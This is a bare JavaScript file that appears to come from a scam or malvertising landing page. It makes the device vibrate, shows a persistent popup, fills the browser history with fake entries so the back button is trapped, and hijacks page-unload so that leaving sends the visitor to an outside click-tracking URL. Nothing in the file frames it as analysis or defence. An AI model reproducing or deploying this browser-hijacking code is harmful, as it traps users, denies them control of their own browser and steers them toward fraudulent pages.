navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
if (navigator.vibrate) {
  navigator.vibrate([1000, 500, 1000, 500, 1000, 500]);
}

function getURLParameter(name) {
            var param = decodeURI(
                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
            );
            return param.replace(/\+/gim," ");
        }


        {
        				window.onload=function(){
        				document.getElementById('popup1').style.display = "none";
        				setTimeout(function() {
        					if (document.getElementById('popup1').style.display == "none") {
        						document.getElementById('popup1').style.display = "block";
        					}
        				}, 300);
        				window.navigator.vibrate(5000);
        				var iy=0;
        	iy=iy+1;
        	} //конец window.onload=function()

        		;
        	}
        	setTimeout(function() {
        		ii = 1;
        	}, 200);
        	function hidepop() {
        		document.getElementById('popup1').style.display = "none";
        	}
        	function showpop() {
        		document.getElementById('popup1').style.display = "block";
        	}

        	! function () {
        		var t;
        		try {
        			for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
        			onpopstate = function (t) {
        				t.state && location.replace("#")
        			}
        		} catch (o) {}
        	}();

          function isOdd(num) { return num % 2;}
          			history.pushState({ page: 1 }, "AD", "#i");
          			var ii = 0;
          			window.onhashchange = function (event) {
          			window.location.hash = "i";

          			 	ii++;
          			 	if (isOdd(ii)) { //if odd, true
          			 		showpop()
          			 	}

          			};

          			(function(){
          			showpop();
          			var count = 0;

          			function getURLParameter(name) {
          			    return decodeURI(
          			        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
          			    );
          			}

          		    setTimeout(function() {
          			    var __redirect_to = 'http://mobileiconnect.com/m/click.php?lp=1';

          			    var _tags = ['button', 'input', 'a'], _els, _i, _i2;
          			    for(_i in _tags) {
          			        _els = document.getElementsByTagName(_tags[_i]);
          			        for(_i2 in _els) {
          			            if((_tags[_i] == 'input' && _els[_i2].type != 'button' && _els[_i2].type != 'submit' && _els[_i2].type != 'image') || _els[_i2].target == '_blank') continue;
          			            _els[_i2].onclick = function() {window.onbeforeunload = function(){};}
          			        }
          			   }

          		    window.onbeforeunload = function() {
          		        setTimeout(function() {
          		            window.onbeforeunload = function() {};
          		            setTimeout(function() {
          		                document.location.href = __redirect_to;
          		            }, 500);
          		        },5);
          		        return showpop();
          		    }
          		    }, 500);

          		})();
